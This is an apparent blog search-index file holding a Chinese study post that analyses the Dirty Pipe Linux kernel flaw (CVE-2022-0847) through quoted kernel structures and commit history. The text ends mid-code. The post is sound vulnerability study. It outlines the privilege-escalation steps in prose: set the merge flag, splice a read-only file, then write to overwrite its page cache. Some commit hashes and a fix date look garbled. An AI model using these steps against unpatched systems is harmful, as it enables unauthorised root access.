<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>The Dirty Pipe Vulnerability[学习记录]</title>
    <link href="/2022/04/10/The%20Dirty%20Pipe%20Vulnerability_%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/04/10/The%20Dirty%20Pipe%20Vulnerability_%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本人Web手，初探内核漏洞，不会GDB调，只能反复研读他人资料，拾人牙慧。</p><p>全文基本都是缝合他人的资料，以形成自己的理解逻辑。介意的请Ctrl+F4,或者跳转文末看相关参考链接</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul><li><strong>CVE编号</strong>：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847">CVE-2022-0847</a></li><li><strong>描述</strong>：在Linux内核中，新引入的管道缓冲区结构中的“flags”成员在<code>copy_page_to_iter_pipe</code>和<code>push_pipe函数</code>中缺少正确初始化，因此可能包含之前的值，这是一个问题。未经授权的本地用户可以使用此漏洞写入由只读文件支持的页面缓存中的页面，从而提升他们在系统上的权限。</li><li><strong>漏洞发现过程</strong>：<a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability -by Max Kellermann</a> 。<a href="https://corp0ra1.github.io/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/">中文翻译版本 -by corp0ra1</a></li><li><strong>漏洞影响版本</strong>：5.8 &lt;= Linux内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</li><li><strong>漏洞CVSS评分</strong>：7.8</li><li><strong>危害等级</strong>：高危</li><li><strong>修复方案</strong>：升级Linux内核到5.16.11、5.15.25、5.10.102及以上版本。</li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="Page和Page-Cache"><a href="#Page和Page-Cache" class="headerlink" title="Page和Page Cache"></a>Page和Page Cache</h2><p>CPU管理的最小内存单位是一个<code>页面(Page)</code>, 一个页面通常为4KB大小, Linux内存管理的最底层的一切都是关于页面的, 文件IO也是如此, 如果程序从文件中读取数据, 内核将先把它从磁盘读取到专属于内核的<code>页面缓存(Page Cache)</code>中, 后续再把它从内核区域复制到用户程序的内存空间中;</p><ol><li><strong>背景</strong>：磁盘的IO读写速度非常慢，所以通常在访问磁盘文件时，首先将其内容加载到物理内存中，然后再直接访问内存中的副本以读取数据。由于文件的内存拷贝，以后可能会被许多进程打开和使用。比如微信可能会打开本地文本，word软件也可能会打开相同的文本，使用副本就不用重复加载。</li><li><strong>解决方案</strong>：为了确保每个人都能快速访问，Linux设计了一种页面缓存机制来管理物理内存中映射的页面帧。如果用户进程使用读/写来读写文件，内核将首先将加载数据的物理内存映射到内核虚拟内存缓冲区。然后将内核缓冲区数据复制到用户模式。<br> <img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled.png"></li><li><strong>管道与界面缓存</strong>：不仅文件使用Page Cache，管道也使用Page Cache。在内核中，pipe的数据结构管理如下：pipe有一个大小为16的环形缓冲区数组，其中存储16个pipe_buf结构，每个pipe_buf结构都有一个指向表示物理内存页的结构的指针。每个页面的大小为4KB（不是连续存储）。<br> <img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%201.png">  </li></ol><h2 id="splice和零拷贝"><a href="#splice和零拷贝" class="headerlink" title="splice和零拷贝"></a>splice和零拷贝</h2><ol><li>背景：每一次都把文件数据从内核空间拷贝到用户空间, 将会拖慢系统的运行速度, 也会额外消耗很多内存空间</li><li>零拷贝技术：如果追求效率，内核还提供零拷贝模式（无系统调用，跨用户和内核边界切换上下文）:通过mmap方法，将文件映射到用户进程虚拟内存空间，代替<code>read/write/ioctl</code>的访问方式，此时内存拷贝过程只有“用户空间到虚拟内存空间”，省去了“用户到内核”的拷贝过程，在数据量大的情况下能显著提升读写效率。</li><li>splice()与零拷贝技术：Linux 2.6.17新加入的系统调用<code>splice()</code>,用于在两个文件间移动数据，而无需内核态和用户态的内存拷贝，但需要借助管道实现。<ol><li>解释一：splice在实现上，使用指向管道缓存页的指针指向文件缓存页(前文提及“不仅文件使用Page Cache，管道也使用Page Cache”)</li><li>解释二：目标文件的页面缓存数据不会直接复制到Pipe的环形缓冲区内, 而是以索引的方式(即 内存页框地址、偏移量、长度 所表示的一块内存区域)复制到了pipe_buffer的结构体中, 如此就避免了从内核空间向用户空间的数据拷贝过程, 所以被称为”零拷贝”;</li><li>解释三：通过pipe buffer实现一组内核内存页（pages of kernel memory）的引用计数指针（reference-countedpointers），数据拷贝过程中并不真正拷贝数据，而是创建一个新的指向内存页的指针。也就是说拷贝过程实质是指针的拷贝，称为零拷贝技术。</li></ol></li><li>补充：splice底层实现，校验了file的读属性，但是没有校验写权限→漏洞产生原因之一</li><li>splice()函数的定义，如下图，内容源自：<a href="https://man7.org/linux/man-pages/man2/splice.2.html">splice(2) — Linux manual page</a><br> <img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%202.png"></li></ol><h2 id="pipe相关"><a href="#pipe相关" class="headerlink" title="pipe相关"></a>pipe相关</h2><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><ol><li>概念：管道(Pipe)是一个程序向另一个程序发送数据的一种方式, </li><li>目的：将管道视为一个程序无需先将其写入磁盘即可与另一个程序对话的一种方式，这通常会加快程序速度。</li><li>特点：它包含一个输入端和一个输出端, 程序将数据从一段输入, 从另一端读出; 在内核中, 为了实现这种数据通信, 需要以页面(Page)为单位维护一个<code>环形缓冲区</code>(pipe_buffer), 它通常最多包含16个页面, 且可以被循环利用;</li></ol><h3 id="pipe-buffer的merge操作"><a href="#pipe-buffer的merge操作" class="headerlink" title="pipe buffer的merge操作"></a>pipe buffer的merge操作</h3><ol><li>背景：当一个程序使用管道写入数据时, pipe_write()调用会处理数据写入工作, 默认情况下, 多次写入操作是要写入环形缓冲区的一个新的页面的, 但是如果单次写入操作没有写满一个页面大小, 就会造成内存空间的浪费</li><li>解决方案：pipe_buffer中的每一个页面都包含一个<code>can_merge</code>属性, 该属性可以在下一次pipe_write()操作执行时, 指示内核继续向同一个页面继续写入数据, 而不是获取一个新的页面进行写入</li></ol><h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><ol><li>为什么了解这部分？pipe靠pipe_bufffer来管理page。<br><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%203.png"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L57</span><br><br><span class="hljs-comment">//struct pipe_inode_info - a linux kernel pipe  为一个环形队列</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span>   <span class="hljs-comment">//指向pipe_buffer的指针</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span> <span class="hljs-comment">//为临时申请的界面</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail; <br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> max_usage;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ring_size; <span class="hljs-comment">//为环形结构队列</span><br>…… ……<br>&#125;<br><br><span class="hljs-comment">//struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span> <span class="hljs-comment">//the page containing the data for the pipe buffer</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> offset, len;<br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span> <span class="hljs-comment">//pipe_buf的相关操作</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags; <span class="hljs-comment">//pipe buffer的flags.见下面</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">private</span>;<br>&#125;;<br><br><span class="hljs-comment">//默认的pipe_buffer为16个</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_DEF_BUFFERS16   </span><br><span class="hljs-comment">//pipe_buffer的flag</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT0x04<span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET0x08<span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE0x10<span class="hljs-comment">/* can merge buffers */</span></span><br></code></pre></td></tr></table></figure></li></ol><h3 id="pipe-buf-operations"><a href="#pipe-buf-operations" class="headerlink" title="pipe_buf_operations"></a>pipe_buf_operations</h3><p>说明：pipe_buf_operations只是个抽象，标识pipe_buffer的操作</p><p>为什么需要了解这部分？因为merge操作的时候涉及到匿名函数的判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/fs/pipe.c#L93</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">//-&gt;confirm()验证管道缓冲区中的数据是否存在以及内容是否良好。</span><br><span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);<br><span class="hljs-comment">//当此管道缓冲区的内容已被读取器完全使用时，将调用--&gt;release（）。</span><br><span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);<br><span class="hljs-comment">//尝试获取管道缓冲区及其内容的所有权。</span><br><span class="hljs-comment">//try_steal()返回true表示成功，在这种情况下，管道(buf-&gt;page)的内容被锁定，并且完全归调用者所有。</span><br><span class="hljs-comment">//页面可能会被转移到不同的映射，最常用的情况是插入到不同的文件地址空间缓存中。</span><br><span class="hljs-built_in"><span class="hljs-keyword">bool</span></span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);<br><span class="hljs-comment">//获取对管道缓冲区的引用。</span><br><span class="hljs-built_in"><span class="hljs-keyword">bool</span></span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);<br>……………………<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>.confirm = generic_pipe_buf_confirm,<br>.release = anon_pipe_buf_release,<br>.steal = anon_pipe_buf_steal,<br>.get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>.release= anon_pipe_buf_release,<br>.try_steal= anon_pipe_buf_try_steal,<br>.get= generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">anon_pipe_buf_try_steal</span><span class="hljs-params">(struct pipe_inode_info *pipe,struct pipe_buffer *buf)</span></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">page_count</span>(page) != <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-built_in">memcg_kmem_uncharge_page</span>(page, <span class="hljs-number">0</span>);<br>__SetPageLocked(page);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞理解"><a href="#漏洞理解" class="headerlink" title="漏洞理解"></a>漏洞理解</h1><h2 id="开发者视角：关于can-merge标志的变更"><a href="#开发者视角：关于can-merge标志的变更" class="headerlink" title="开发者视角：关于can_merge标志的变更"></a>开发者视角：关于can_merge标志的变更</h2><ol><li>很久之前， <code>struct pipe_buf_operations</code> 有一个flag为<code>can_merge</code>  。目的使pipe_buf可以合并并复用，以提高利用效率。</li><li><strong>Linux 2.6.16, 2006</strong>：<a href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Commit 5274f052e7b3 “Introduce sys_splice() system call”</a> 。引入了<code>splice()</code>系统调用，同时引入了<code>page_cache_pipe_buf_ops</code>，这是一个<code>struct pipe_buf_operations</code>实现，用于pipe_buf来指向page cache。该结构体的第一个属性为<code>can_merge=0</code>（表示管道缓冲区不可合并）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// fs/splice.c #L70</span><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">page_cache_pipe_buf_ops</span> =</span> &#123;<br>.can_merge = <span class="hljs-number">0</span>,<br>.map = page_cache_pipe_buf_map,<br>.unmap = page_cache_pipe_buf_unmap,<br>.release = page_cache_pipe_buf_release,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><strong>Linux 5.1, 2019</strong>： <a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Commit 01e7187b4119 “pipe: stop using -&gt;can_merge”</a>将can_merge的flag重构为与<code>struct pipe_buf_operations</code>指针比较的函数<code>pipe_buf_can_merge()</code><ol><li>原因：因为只有一种类型的管道缓冲区<code>anon_pipe_buf_ops</code> 可以设置此标志为1，其他类型的则为0。但考虑到<code>can_merge</code>字段在结构体中占一个int大小的空间，因此把判断能否merge的操作改为指针判断，将所有的<code>pipe_buf_operations</code>结构体中的<code>can_merge</code>属性删除（包括splice.c中引入<code>page_cache_pipe_buf_ops</code>中的can_merge属性）。函数换变量，时间换空间，合情合理。<br><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%204.png"><br><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%205.png"><br><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%206.png"></li></ol></li><li><strong>Linux 5.8, 2020</strong>： <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops”</a>将判断merge与否的函数<code>pipe_buf_can_merge()</code> 重构为每个缓冲区flag<code>PIPE_BUF_FLAG_CAN_MERGE</code>.<br> 原因：<ol><li>因为这几个<code>pipe_buf_operations</code>类型的结构体的结构是相同的，只是通过结构体名次来区分packet和merge的行为而已，故考虑将之合并为一个结构体。</li><li>原本pipe_buf有一个flags属性来标记packet行为，那么可以通过复用该flags属性来区分packet和merge的行为</li><li>将函数又换回常量，但实现代码的简洁和原始操作的不变动。这个初衷也合理<br><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%207.png">  </li></ol></li><li>总结can_merge的变换过程：从<code>pipe_buf_operations</code> 结构体中的属性，为了节省一个int的空间变为一个函数，再通过复用flags变量变成一个常量，每一步都合情合理。但是问题是：<ol><li>其他文件和其他函数中，使用了can_merge的部分的代码都发生相应改变了吗？→漏洞的原因：有个地方漏了</li><li>现在什么情况下会设置pipe_buffer的flag为can_merge→漏洞的触发点</li></ol></li></ol><h2 id="漏洞视角：copy-page-to-iter-pipe、page-cache-pipe-buf-ops和can-merge"><a href="#漏洞视角：copy-page-to-iter-pipe、page-cache-pipe-buf-ops和can-merge" class="headerlink" title="漏洞视角：copy_page_to_iter_pipe、page_cache_pipe_buf_ops和can_merge"></a>漏洞视角：copy_page_to_iter_pipe、page_cache_pipe_buf_ops和can_merge</h2><p>在can_merge变迁过程中被遗漏的函数<code>copy_page_to_iter_pipe()</code>，也是漏洞之因：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/241699cd72a8489c9446ae3910ddd243e9b9061b/lib/iov_iter.c#L339</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,struct iov_iter *i)</span></span><br><span class="hljs-function"></span>&#123;<br><br>…… ……<br><span class="hljs-comment">//[1] 将pipe_buffer指向当前需要写入的页的指针指向文件的缓存页，并设置其他信息，完成初始化操作</span><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br><span class="hljs-comment">//[2]  后续补丁是在此专门完成对pipe_buf中flag变量的初始化</span><br><span class="hljs-comment">//buf-&gt;flags = 0;</span><br><span class="hljs-built_in">get_page</span>(buf-&gt;page = page);<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br>…… ……<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>Linux 2.6.16, 2006：最早<code>can_merge</code>标识在<code>ops</code>即<code>pipe_buf_operations</code>结构体中。<ol><li><code>pipe_buf_operations</code>有多种类型，比如<code>anon_pipe_buf_ops</code> 和<code>page_cache_pipe_buf_ops，</code>但是此时只有<code>anon_pipe_buf_ops</code>结构体中的<code>can_merge</code>属性为1，其他<code>ops</code>中则为0。可以理解为“<code>anon_pipe_buf_ops</code>和<code>can_merge</code>是强关联的”</li></ol></li><li>Linux 4.9,2016时期，<a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit 243e9b9061b “new iov_iter flavour: pipe-backed”</a>：添加了iov_iter对Pipe的支持，引入了<code>copy_page_to_iter_pipe()</code>与<code>push_pipe()</code>函数。<ol><li>此时执行完<code>copy_page_to_iter_pipe()</code>函数中的<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>操作，pipe buffer的<code>can_merge</code>的属性会被初始化为0</li></ol></li><li>Linux 5.1, 2019： <a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Commit 01e7187b4119 “pipe: stop using -&gt;can_merge”</a>将<code>can_merge</code>的flag转换为与<code>struct pipe_buf_operations</code>指针比较。<ol><li>此时执行完<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>操作，pipe buffer的<code>can_merge</code>的属性会保留原属性，不会改变(<code>can_merge</code>属性已经被删除了)，引入了隐患</li><li>但是能否进行<code>can_merge</code>操作的判断是通过<code>pipe_buf_can_merge()</code>函数实现，而<code>pipe_buf_can_merge()</code>函数则是判断该<code>ops</code>是否为<code>anon_pipe_buf_ops</code> ，使得最终<code>can_merge</code>的判断还是和<code>anon_pipe_buf_ops</code>是强关联的。</li><li>即此时<code>page_cache_pipe_buf_ops</code>虽然没有<code>can_merge</code>属性，但其类型是非anon的，也能达到<code>can_merge=0</code>的效果，所以此时不会触发漏洞</li></ol></li><li>Linux 5.8, 2020： <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops”</a> 将<code>pipe_buf_can_merge()</code>函数中的指针比较转换为每个缓冲区的flag<code>PIPE_BUF_FLAG_CAN_MERGE</code><ol><li>此时的<code>anon_pipe_buf_ops</code>不能再与<code>can_merge</code>强关联，暴露了<code>page_cache_pipe_buf_ops</code> 中的<code>can_merge</code>属性是未改变的隐患，就造成了漏洞的产生</li></ol></li><li>漏洞的操作：<ol><li>先将pipe_buf的状态设置为<code>PIPE_BUF_FLAG_CAN_MERGE</code> </li><li>再通过<code>splice</code>函数调用<code>copy_page_to_iter_pipe</code>函数，此时将pipe_buf中当前需要写入的页的指针指向所打开的文件的缓存页，没有改变pipe_buf原来的can_merge属性(此属性最早本应将之置0的，但是由于数次改动，而没有做这步工作)</li><li>最后执行<code>pipe_write()</code>写入操作，向pipe_buf写入脏数据。此时由于pipe_buf指针指向所打开的文件缓存页，且pipe_buf设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> ，所以没有申请新的页，直接在当前打开的文件缓存页中写入内容，进而实现了该文件内容的篡改</li></ol></li><li>Linux 5.17,2021：<a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">Commit  7ee4446017903  “lib/iov_iter: initialize “flags” in new pipe_buffer”</a>  : 在<code>copy_page_to_iter_pipe()</code>执行完<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>后设置了flags的初始化<code>buf-&gt;flags = 0</code>，修复了漏洞</li></ol><h2 id="pipe-write函数分析"><a href="#pipe-write函数分析" class="headerlink" title="pipe_write函数分析"></a>pipe_write函数分析</h2><ol><li>为什么了解？除了其涉及到写操作外，还涉及到can_merge标志如何设置，如何判断界面是否可以merge</li><li>什么时候续写merge?当向管道中写入数据，如果①管道非空②写入的数据拼接在之前的数据后面长度不会超过一页的大小②设有<code>PIPE_BUF_FLAG_CAN_MERGE</code>的flag，则可以续写</li><li>什么时候会设置<code>PIPE_BUF_FLAG_CAN_MERGE</code>的flag?如果无法在上一页续写，则会申请一个新页，并且在非<code>O_DIRECT</code>直接的情况下，则会设置<code>PIPE_BUF_FLAG_CAN_MERGE</code>(默认都会设置这个)</li><li>详情见代码</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/5274f052e7b3dbd81935772eb551dfd0325dfa9d/fs/pipe.c#L236</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span><br><span class="hljs-function"></span>&#123;<br>    ………………<br>    <span class="hljs-comment">//如果 pipe 读者的数量为 0，则向进程发送 SIGPIPE 信号，并返回 EPIPE 错误。</span><br>    <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br><span class="hljs-built_in">send_sig</span>(SIGPIPE, current, <span class="hljs-number">0</span>);<br>ret = -EPIPE;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>    ………………<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Only wake up if the pipe started out empty, since otherwise there should be no readers waiting.</span><br><span class="hljs-comment"> * If it wasn&#x27;t empty we try to merge new data into the last buffer.（ 如果不是空的，我们会尝试将新数据合并到最后一个缓冲区中）</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * That naturally merges small writes, but it also age-aligs the rest of the writes for large writes spanning multiple pages.</span><br><span class="hljs-comment"> */</span><br>head = pipe-&gt;head;<br>was_empty = <span class="hljs-built_in">pipe_empty</span>(head, pipe-&gt;tail);<span class="hljs-comment">//判断head和tail是否相等   </span><br>    <span class="hljs-comment">//按位与运算通常用来对某些位清0或保留某些位。例如把a的高八位清0保留低八位，可作a&amp;255运算(255的二进制数为0000000011111111)</span><br>    <span class="hljs-comment">//此处类似于mod 取余的作用：计算要写入的数据总大小是否是页帧大小的倍数，并将余数保存在 chars 变量中</span><br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<span class="hljs-comment">//size_t total_len = iov_iter_count(to         </span><br>        <br>  <span class="hljs-comment">//[1]如果管道非空且chars不为0，则尝试从当前最后一页接着写</span><br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br><span 